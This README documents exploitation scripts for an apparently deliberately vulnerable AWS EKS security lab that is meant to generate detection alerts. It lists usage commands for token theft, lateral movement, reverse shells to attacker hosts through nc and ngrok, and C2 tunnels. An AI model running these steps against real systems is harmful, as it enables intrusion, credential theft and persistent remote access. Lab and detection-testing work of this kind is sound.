# Exploitation and Lateral Movement Scripts

This directory contains scripts to exploit vulnerabilities in deployed applications and perform lateral movement in the infrastructure.

## ⚠️ Warning

These scripts are designed **only for a security lab environment**. Do not use these scripts on production systems or without explicit authorization.

## Available Scripts

### 1. `exploit-web-app.sh`
Exploits vulnerabilities in the vulnerable web application.

**Usage:**
```bash
./exploit-web-app.sh <BASE_URL>
```

**Example:**
```bash
# From the bastion, after setting up port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-web-app 3000:3000 &
./exploit-web-app.sh http://localhost:3000
```

**Exploited vulnerabilities:**
- XSS (Cross-Site Scripting)
- SQL Injection
- Path Traversal
- Command Injection
- Secret exposure
- Debug information

### 2. `exploit-api.sh`
Exploits vulnerabilities in the vulnerable API.

**Usage:**
```bash
./exploit-api.sh <BASE_URL>
```

**Example:**
```bash
kubectl port-forward -n vulnerable-apps svc/vulnerable-api 5000:5000 &
./exploit-api.sh http://localhost:5000
```

**Exploited vulnerabilities:**
- Command Injection
- Path Traversal
- SSRF (Server-Side Request Forgery)
- Weak authentication
- Environment variable exposure
- Unsafe deserialization (Pickle, YAML)

### 3. `exploit-database.sh`
Exploits the vulnerable database with weak credentials.

**Usage:**
```bash
./exploit-database.sh <HOST> [PORT]
```

**Example:**
```bash
kubectl port-forward -n vulnerable-apps svc/vulnerable-database 3306:3306 &
./exploit-database.sh localhost 3306
```

**Exploited vulnerabilities:**
- Weak credentials (root/root123, admin/admin123, test/test123)
- Excessive permissions
- Sensitive data reading
- System file reading

### 4. `lateral-movement.sh`
Performs lateral movement from the bastion to the Kubernetes cluster.

**Usage:**
```bash
./lateral-movement.sh
```

**Requirements:**
- Access to bastion
- AWS CLI configured
- Permissions to access EKS cluster

**Actions performed:**
- kubectl configuration
- Namespace, pod, service enumeration
- Secret and configmap search
- Permission verification
- Privileged pod identification

### 5. `exploit-k8s.sh`
Exploits vulnerabilities in Kubernetes cluster configuration.

**Usage:**
```bash
./exploit-k8s.sh [NAMESPACE]
```

**Example:**
```bash
./exploit-k8s.sh vulnerable-apps
```

**Exploited vulnerabilities:**
- Privileged security context
- Secret reading
- Service account token access
- Sensitive environment variables
- Possible container escapes

### 6. `enumerate-resources.sh`
Enumerates all resources in the Kubernetes cluster.

**Usage:**
```bash
./enumerate-resources.sh
```

**Enumerated resources:**
- Nodes, namespaces, pods
- Services, deployments, statefulsets
- ConfigMaps, secrets, service accounts
- Roles, role bindings, cluster roles
- Ingress, persistent volumes
- Network policies

### 7. `get-shell.sh`
Gets an interactive shell in a pod.

**Usage:**
```bash
./get-shell.sh [NAMESPACE] [POD_NAME]
```

**Example:**
```bash
./get-shell.sh vulnerable-apps vulnerable-web-app-xxx
```

### 8. `steal-service-account-token.sh`
Steals service account tokens from pods and uses them for access.

**Usage:**
```bash
./steal-service-account-token.sh [NAMESPACE] [POD_NAME]
```

**Example:**
```bash
./steal-service-account-token.sh vulnerable-apps vulnerable-web-app-xxx
```

**Actions performed:**
- Extracts service account tokens
- Creates kubectl context with stolen token
- Verifies token permissions
- Saves information for later use

### 9. `reverse-shell.sh`
Establishes a reverse shell from a pod to the attacker.

**Usage:**
```bash
./reverse-shell.sh <NAMESPACE> <POD_NAME> <ATTACKER_IP> <ATTACKER_PORT>
```

**Example:**
```bash
# On attacker (bastion):
nc -lvp 4444

# Run script:
./reverse-shell.sh vulnerable-apps vulnerable-web-app-xxx <BASTION_IP> 4444
```

**Supported methods:**
- bash
- netcat (nc)
- python
- perl
- php

### 10. `master-exploit.sh`
Master script that runs all exploitation scripts in sequence.

**Usage:**
```bash
./master-exploit.sh
```

**Actions performed:**
1. Cluster access configuration
2. Resource enumeration
3. Lateral movement
4. Vulnerable application exploitation
5. Kubernetes vulnerability exploitation

### 11. `reverse-shell-persistent.sh`
Establishes persistent reverse shells from containers accessible from outside AWS.

**Usage:**
```bash
./reverse-shell-persistent.sh <NAMESPACE> <ATTACKER_IP> <ATTACKER_PORT> [METHOD]
```

**Example:**
```bash
# With your public IP or domain
./reverse-shell-persistent.sh vulnerable-apps your-public-ip.com 4444 all

# With ngrok (see ngrok-setup.sh first)
./reverse-shell-persistent.sh vulnerable-apps 0.tcp.ngrok.io 12345 python
```

**Available methods:**
- `all` - Try all methods
- `bash` - Use bash
- `python` - Use python
- `nc` - Use netcat

### 12. `generate-noise.sh`
Generates lots of noise and suspicious activity to generate alerts.

**Usage:**
```bash
./generate-noise.sh [NAMESPACE] [INTENSITY]
```

**Example:**
```bash
./generate-noise.sh vulnerable-apps high
```

**Generated activities:**
- Massive network scanning
- Port scanning
- Kubernetes API enumeration
- Suspicious processes
- Secret access attempts
- Suspicious HTTP traffic
- Suspicious files
- Privilege escalation attempts
- Simulated data exfiltration
- Backdoors
- Configuration modification
- Suspicious logs

### 13. `advanced-attacks.sh`
Advanced script with multiple attack techniques (MITRE ATT&CK).

**Usage:**
```bash
./advanced-attacks.sh [NAMESPACE]
```

**Executed techniques:**
- Credential Dumping
- Lateral Movement
- Persistence
- Defense Evasion
- Collection
- Exfiltration
- Impact
- Discovery
- Privilege Escalation
- Command and Control
- Suspicious Network Traffic
- Malicious Files

### 14. `establish-c2.sh`
Establishes a C2 (Command & Control) using ngrok or similar for access from outside AWS.

**Usage:**
```bash
./establish-c2.sh [NAMESPACE] [C2_PORT] [METHOD]
```

**Example:**
```bash
./establish-c2.sh vulnerable-apps 4444 ngrok
```

**Available methods:**
- `ngrok` - Use ngrok (requires account)
- `serveo` - Use serveo.net (free, no account required)
- `localtunnel` - Use localtunnel

### 15. `ngrok-setup.sh`
Configures ngrok and provides information to establish reverse shells.

**Usage:**
```bash
./ngrok-setup.sh [LISTEN_PORT]
```

**Example:**
```bash
# Configure ngrok on port 4444
./ngrok-setup.sh 4444

# In another terminal, listen
nc -lvp 4444

# From pods, use the provided public URL
```

### 16. `master-attack.sh`
Master script that runs all advanced attacks to generate maximum noise.

**Usage:**
```bash
./master-attack.sh [NAMESPACE] [ATTACKER_IP] [ATTACKER_PORT]
```

**Example:**
```bash
# With your public IP
./master-attack.sh vulnerable-apps your-public-ip.com 4444

# With ngrok
./master-attack.sh vulnerable-apps 0.tcp.ngrok.io 12345
```

**Executed phases:**
1. Generate basic noise
2. Execute advanced attacks
3. Establish reverse shells
4. Exploit application vulnerabilities
5. Lateral movement
6. Exploit Kubernetes
7. Steal tokens

## Recommended Workflow

### From your local machine:

1. **Connect to bastion:**
```bash
ssh -p 22222 -i ~/.ssh/bastion_key ubuntu@<BASTION_IP>
```

2. **Configure cluster access:**
```bash
export AWS_REGION=<your-region>
export CLUSTER_NAME=lab-cluster
aws eks update-kubeconfig --region $AWS_REGION --name $CLUSTER_NAME
```

3. **Copy scripts to bastion:**
```bash
# From your local machine
scp -P 22222 -i ~/.ssh/bastion_key -r exploitation/ ubuntu@<BASTION_IP>:~/
```

4. **Run exploitation scripts:**
```bash
# On the bastion
cd ~/exploitation
chmod +x *.sh
./master-exploit.sh
```

### From the bastion directly:

If scripts are already on the bastion:

```bash
cd exploitation
./master-exploit.sh
```

## Individual Usage Examples

### Exploit web application:

```bash
# Set up port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-web-app 3000:3000 &

# Run exploitation
./exploit-web-app.sh http://localhost:3000
```

### Exploit API:

```bash
# Set up port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-api 5000:5000 &

# Run exploitation
./exploit-api.sh http://localhost:5000
```

### Exploit database:

```bash
# Set up port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-database 3306:3306 &

# Run exploitation
./exploit-database.sh localhost 3306
```

### Get shell in a pod:

```bash
# List pods
kubectl get pods -n vulnerable-apps

# Get shell
./get-shell.sh vulnerable-apps <pod-name>
```

### Steal service account token:

```bash
# Steal token and create context
./steal-service-account-token.sh vulnerable-apps <pod-name>

# Use stolen context
kubectl --context=stolen-context get pods
```

### Establish reverse shell:

```bash
# On attacker (bastion), start listener:
nc -lvp 4444

# From another terminal, run:
./reverse-shell.sh vulnerable-apps <pod-name> <BASTION_IP> 4444
```

### Establish persistent reverse shell accessible from outside AWS:

```bash
# Option 1: With ngrok (recommended)
# Terminal 1: Configure ngrok
./ngrok-setup.sh 4444

# Terminal 2: Listen locally
nc -lvp 4444

# Terminal 3: Establish reverse shells from pods
./reverse-shell-persistent.sh vulnerable-apps <NGROK_HOST> <NGROK_PORT> all

# Option 2: With your public IP
./reverse-shell-persistent.sh vulnerable-apps your-public-ip.com 4444 python
```

### Generate lots of noise:

```bash
# Generate suspicious activity
./generate-noise.sh vulnerable-apps high

# Run all advanced attacks
./advanced-attacks.sh vulnerable-apps

# Run everything together (maximum noise)
./master-attack.sh vulnerable-apps your-public-ip.com 4444
```

## Troubleshooting

### Error: "kubectl: command not found"
```bash
# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/
```

### Error: "Unable to connect to the server"
```bash
# Verify cluster configuration
aws eks update-kubeconfig --region <region> --name lab-cluster
kubectl cluster-info
```

### Error: "Permission denied"
```bash
# Verify permissions
kubectl auth can-i --list
```

### Port-forward not working
```bash
# Verify service exists
kubectl get services -n vulnerable-apps

# Verify pods are running
kubectl get pods -n vulnerable-apps
```

## Important Notes

1. **Port-forwarding:** Scripts that require service access use port-forwarding. Make sure port-forwards are active before running scripts.

2. **Permissions:** Some scripts require specific permissions in the cluster. Make sure you have the necessary permissions.

3. **Dependencies:** Some scripts require additional tools like `jq`, `mysql-client`, `python3`. Install them if necessary.

4. **Security:** These scripts are designed for a lab. In production, these vulnerabilities would be critical and must be fixed immediately.

## Next Steps

After exploiting vulnerabilities, you can:

1. **Document findings:** Create a report of found vulnerabilities
2. **Create fixes:** Develop patches for vulnerabilities
3. **Implement controls:** Add security controls to prevent these vulnerabilities
4. **Monitoring:** Implement monitoring to detect exploitation attempts

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [AWS EKS Security](https://docs.aws.amazon.com/eks/latest/userguide/security.html)
